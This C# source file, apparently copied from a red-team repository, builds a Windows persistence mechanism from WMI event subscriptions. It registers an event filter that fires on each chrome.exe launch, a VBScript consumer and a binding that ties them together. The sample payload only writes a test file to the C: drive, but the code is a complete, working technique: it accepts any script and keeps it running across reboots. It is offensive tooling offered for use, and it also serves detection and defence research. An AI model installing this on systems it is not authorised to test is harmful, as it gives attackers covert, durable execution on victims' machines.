// Taken from https://github.com/mdsecactivebreach/WMIPersistence
// Author: @domchell

using System;
using System.Text;
using System.Management;

namespace WMIPersistence
{
  class Program
  {
    static void Main(string[] args)
    {
      PersistWMI();
    }
    static void PersistWMI()
    {
      ManagementObject myEventFilter = null;
      ManagementObject myEventConsumer = null;
      ManagementObject myBinder = null;

      String vbscript = "Dim fso, MyFile : Set fso = CreateObject(\"Scripting.FileSystemObject\") : Set MyFile = fso.CreateTextFile(\"c:\\WMI-CSharp-vbs.txt\", True) : MyFile.WriteLine(\"test\") : MyFile.Close";
      String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
                           "WHERE TargetInstance ISA \"Win32_Process\" " +
                           "AND TargetInstance.Name = \"chrome.exe\"";

      try
      {
        ManagementScope scope = new ManagementScope(@"\\.\root\subscription");

        ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);


        WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
        myEventFilter = wmiEventFilter.CreateInstance();
        myEventFilter["Name"] = "BugSecFilter";
        myEventFilter["Query"] = myEventQuery.QueryString;
        myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
        myEventFilter["EventNameSpace"] = @"\root\cimv2";
        myEventFilter.Put();
        Console.WriteLine("[*] Event filter created.");

        myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();
        myEventConsumer["Name"] = "BugSecConsumer";
        myEventConsumer["ScriptingEngine"] = "VBScript";
        myEventConsumer["ScriptText"] = vbscript;
        myEventConsumer.Put();

        Console.WriteLine("[*] Event consumer created.");

        myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();
        myBinder["Filter"] = myEventFilter.Path.RelativePath;
        myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
        myBinder.Put();

        Console.WriteLine("[*] Subscription created");
      }
      catch (Exception e)
      {
        Console.WriteLine(e);
      }
      Console.ReadKey();
    }
  }
}